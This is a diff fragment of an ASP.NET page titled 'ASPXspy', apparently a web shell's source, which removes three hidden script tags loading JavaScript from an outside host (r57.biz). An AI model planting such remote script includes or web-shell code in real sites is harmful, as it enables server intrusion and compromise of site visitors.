@@ -2311,12 +2311,9 @@ yhv.Visible=false;
 }
 </script>
 <html xmlns="http://www.w3.org/1999/xhtml" >
-<SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
 <head id="Head1" runat="server">
-<SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
 <title>ASPXspy</title>
-<SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
 <style type="text/css">
 .Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}
 body,td{font: 12px Arial,Tahoma;line-height: 16px;}
